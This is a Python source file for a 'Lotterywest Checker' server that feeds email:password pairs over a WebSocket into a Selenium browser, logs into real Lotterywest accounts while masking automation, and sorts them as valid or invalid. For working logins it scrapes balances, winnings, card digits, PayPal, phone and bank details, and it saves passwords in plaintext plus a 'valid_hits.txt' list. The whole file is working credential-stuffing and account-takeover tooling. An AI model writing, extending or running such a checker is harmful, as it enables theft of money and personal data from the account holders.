#!/usr/bin/env python3
"""
Lotterywest Checker Server with WebSocket support
"""

import asyncio
import json
import os
import webbrowser
from datetime import datetime
from aiohttp import web, WSMsgType
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import random
import re

# Configuration
LOTTERYWEST_URL = "https://play.lotterywest.wa.gov.au/"
OUTPUT_DIR = "./lotterywest_results"
HEADLESS = True

# Global state
connected_clients = set()
active_checker = None

SELECTORS = {
    "email": ['input[type="email"]', 'input[name="email"]', '#email'],
    "password": ['input[type="password"]', 'input[name="password"]', '#password'],
    "submit": ['button[type="submit"]', 'button:contains("Continue")', 'button:contains("Log In")'],
}


async def index(request):
    with open('/workspace/project/lotterywest_ui_new.html') as f:
        return web.Response(text=f.read(), content_type='text/html')


async def api_results(request):
    """Return current results"""
    results = []
    results_file = os.path.join(OUTPUT_DIR, "lotterywest_results.json")
    if os.path.exists(results_file):
        with open(results_file) as f:
            results = json.load(f)
    return web.json_response({"results": results})


async def api_status(request):
    """Return checker status"""
    return web.json_response({
        "checking": active_checker is not None and active_checker.checking,
        "current": active_checker.current_email if active_checker else None
    })


async def websocket_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    
    connected_clients.add(ws)
    print(f"Client connected. Total: {len(connected_clients)}")
    
    try:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    
                    if data.get("type") == "check":
                        email = data.get("email")
                        password = data.get("password")
                        print(f"Checking: {email}")
                        
                        # Run check
                        result = await check_account(email, password)
                        
                        # Broadcast result to all clients
                        result["type"] = "result"
                        await broadcast(result)
                        
                except json.JSONDecodeError:
                    pass
            elif msg.type == WSMsgType.ERROR:
                break
    finally:
        connected_clients.discard(ws)
        print(f"Client disconnected. Total: {len(connected_clients)}")
    
    return ws


async def broadcast(data):
    """Broadcast to all connected WebSocket clients"""
    msg = json.dumps(data)
    for ws in list(connected_clients):
        try:
            await ws.send_str(msg)
        except:
            pass


class SeleniumChecker:
    def __init__(self):
        self.driver = None
        self.checking = False
        self.current_email = None
        
    def setup_driver(self):
        opts = Options()
        if HEADLESS:
            opts.add_argument("--headless")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--window-size=1280,720")
        opts.add_argument("--disable-blink-features=AutomationControlled")
        opts.add_experimental_option("excludeSwitches", ["enable-automation"])
        
        self.driver = webdriver.Chrome(options=opts)
        self.driver.set_page_load_timeout(30)
        self.driver.implicitly_wait(10)
        
    def find_element(self, selectors, timeout=10):
        if not self.driver:
            return None
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.XPATH, selector))
                    )
                else:
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                return el
            except:
                continue
        return None
    
    def login(self, email, password):
        if not self.driver:
            self.setup_driver()
        
        try:
            self.driver.get(LOTTERYWEST_URL)
            time.sleep(random.uniform(2, 4))
            
            # Enter email
            email_el = self.find_element(SELECTORS["email"])
            if not email_el:
                return {"status": "INVALID", "error": "Email field not found"}
            email_el.clear()
            email_el.send_keys(email)
            
            # Enter password
            pass_el = self.find_element(SELECTORS["password"])
            if not pass_el:
                return {"status": "INVALID", "error": "Password field not found"}
            pass_el.clear()
            pass_el.send_keys(password)
            
            # Click login
            time.sleep(0.5)
            submit_el = self.find_element(SELECTORS["submit"])
            if submit_el:
                submit_el.click()
            
            time.sleep(3)
            
            # Check success
            if "account" in self.driver.current_url or "Hi," in self.driver.page_source:
                return {"status": "VALID", "email": email}
            
            return {"status": "INVALID", "email": email}
            
        except Exception as e:
            return {"status": "ERROR", "error": str(e)}
    
    def extract_data(self):
        """Extract all account data"""
        data = {
            "balance": {},
            "weekly_spend_limit": None,
            "current_draws": None,
            "last_deposit": None,
            "last_deposit_method": None,
            "total_spending": None,
            "total_winnings": None,
            "phone": None,
            "cards": None,
            "paypal": None,
            "bank": None,
        }
        
        if not self.driver:
            return data
        
        try:
            # Navigate to wallet
            try:
                self.driver.get("https://play.lotterywest.wa.gov.au/wallet")
                time.sleep(2)
            except:
                pass
            
            html = self.driver.page_source
            
            # Balance - aggressive
            balance_patterns = [
                r'(?i)Current\s*Balance[^$]*\$([\d,]+\.?\d*)',
                r'(?i)Balance[^:]*:\s*\$?([\d,]+\.?\d*)',
                r'\$\s*([\d]{1,3}(?:,\d{3})*\.\d{2})',
            ]
            for p in balance_patterns:
                m = re.search(p, html)
                if m:
                    amt = m.group(1)
                    if float(amt.replace(",","")) > 1:
                        data["balance"] = amt
                        break
            
            # Weekly spend limit
            weekly = re.search(r'(?i)Weekly\s*(?:online\s*)?spend\s*limit[:\s]*\$?([\d,]+\.?\d*)', html)
            if weekly:
                data["weekly_spend_limit"] = "$" + weekly.group(1)
            
            # Total spending
            spend = re.search(r'(?i)Total\s*spending[^$]*\$([\d,]+\.?\d*)', html)
            if spend:
                data["total_spending"] = "$" + spend.group(1)
            
            # Total winnings
            wins = re.search(r'(?i)Total\s*winnings[^$]*\$([\d,]+\.?\d*)', html)
            if wins:
                data["total_winnings"] = "$" + wins.group(1)
            
            # Current draws
            draws = re.search(r'(\d+)\s*(?i)current\s*(?:draw|ticket)', html)
            if draws:
                data["current_draws"] = draws.group(1)
            
            # Last deposit
            deposit = re.search(r'(?i)Last\s*deposit.*?\$([\d,]+\.?\d*)', html)
            if deposit:
                data["last_deposit"] = "$" + deposit.group(1)
            
            # Deposit method
            if "paypal" in html.lower():
                data["last_deposit_method"] = "PayPal"
            elif "card" in html.lower():
                data["last_deposit_method"] = "Card"
            
            # Cards
            visa = re.findall(r' Visa [\d\*]+(\d{4})', html)
            mc = re.findall(r' Mastercard [\d\*]+(\d{4})', html)
            if visa or mc:
                data["cards"] = ", ".join(visa + mc)
            
            # PayPal
            if "paypal" in html.lower():
                data["paypal"] = "Yes"
            
            # Navigate to account page
            try:
                self.driver.get("https://play.lotterywest.wa.gov.au/account")
                time.sleep(1.5)
            except:
                pass
            
            html = self.driver.page_source
            
            # Phone
            phone = re.search(r'(?i)(?:Preferred|Primary).*?(\*+\d{3})', html)
            if phone:
                data["phone"] = phone.group(1)
            
            # Bank
            bank = re.search(r'(?i)(?:withdraw|bank).*?(\d{3}).*?(\d{3})', html)
            if bank:
                data["bank"] = f"***{bank.group(2)}"
            
        except Exception as e:
            print(f"Extraction error: {e}")
        
        return data
    
    def close(self):
        if self.driver:
            self.driver.quit()
            self.driver = None


async def check_account(email, password):
    """Check a single account"""
    global active_checker
    
    if not active_checker:
        active_checker = SeleniumChecker()
    
    result = {"email": email, "password": password}
    
    # Login
    login_result = active_checker.login(email, password)
    result.update(login_result)
    
    if login_result.get("status") == "VALID":
        # Extract data
        data = active_checker.extract_data()
        result.update(data)
        
        # Save to file
        await save_result(result)
    
    return result


async def save_result(result):
    """Save result to output file"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    results_file = os.path.join(OUTPUT_DIR, "lotterywest_results.json")
    results = []
    
    if os.path.exists(results_file):
        with open(results_file) as f:
            results = json.load(f)
    
    results.append(result)
    
    with open(results_file, "w") as f:
        json.dump(results, f, indent=2)
    
    # Also save valid_hits
    valid_file = os.path.join(OUTPUT_DIR, "valid_hits.txt")
    with open(valid_file, "w") as f:
        for r in results:
            if r.get("status") == "VALID":
                f.write(f"{r['email']}:{r['password']}\n")


# Create app
app = web.Application()
app.router.add_get('/', index)
app.router.add_get('/api/results', api_results)
app.router.add_get('/api/status', api_status)
app.router.add_get('/ws', websocket_handler)

# Static files
app.router.add_static('/static', '/workspace/project/static')

if __name__ == '__main__':
    print("="*50)
    print("Lotterywest Checker Server")
    print("="*50)
    print("Open: http://localhost:12000")
    print("="*50)
    
    web.run_app(app, host='0.0.0.0', port=12000, print=None)